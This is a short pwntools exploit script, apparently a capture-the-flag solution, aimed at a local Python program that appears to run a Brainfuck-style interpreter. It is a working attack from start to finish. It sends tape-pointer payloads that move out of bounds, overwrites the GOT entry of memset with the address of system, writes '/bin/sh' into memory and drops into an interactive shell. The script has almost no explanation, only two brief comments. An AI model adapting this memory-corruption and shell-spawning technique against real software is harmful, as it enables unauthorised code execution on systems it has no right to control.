#!/usr/bin/python3

def execute(code):
	p.sendlineafter(">>> ", code)

from pwn import *

if __name__ == "__main__":
	py = ELF("/usr/bin/python3")
	system = py.plt[b"system"]
	p = process(["python3", "./main.py"])
	
	cmd = "/bin/sh\x00"

	shamt = 0x201090 - 0x201028
	snd = ">"*(shamt+1) +"." # shift pointer back to offset 0 and add it to whitelist now we have complete OOB
	snd += "<"*shamt + ",>"*8 # overwrite GOT of memset
	snd += ">"*(shamt - 8)
	snd += ",>"*len(cmd)

	fst = "+[[{}]{}]".format("<"*(shamt+1), snd)

	execute(fst)
	p.recvuntil("\x01")
	pay = p64(system)
	p.send(pay)
	p.send(cmd)
	execute("a")
	p.interactive()
